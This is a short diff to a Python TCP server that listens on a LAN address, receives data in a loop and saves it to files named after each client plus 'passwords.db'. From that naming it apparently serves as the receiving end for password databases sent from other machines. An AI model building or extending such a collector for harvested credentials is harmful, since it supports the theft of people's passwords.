@@ -5,7 +5,7 @@ Created on 20 Jun 2015
 '''
 import socket
 
-HOST = '192.168.0.109'
+HOST = '192.168.0.104'
 PORT = 1991
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -16,11 +16,15 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     with conn:
         print('Connected by: ', addr)
 
-        # Receive data
-        data = conn.recv(1048576)
-        conn.send(b'success')
-        # Write data
-        filename = str(addr) + "passwords.db"
-        with open(filename, "wb") as f:
-            f.write(data)
-            f.flush()
+        while True:
+            # Receive data
+            data = conn.recv(1048576)
+            if not data:
+                break
+
+            conn.send(b'success')
+            # Write data
+            filename = str(addr) + "passwords.db"
+            with open(filename, "wb") as f:
+                f.write(data)
+                f.flush()
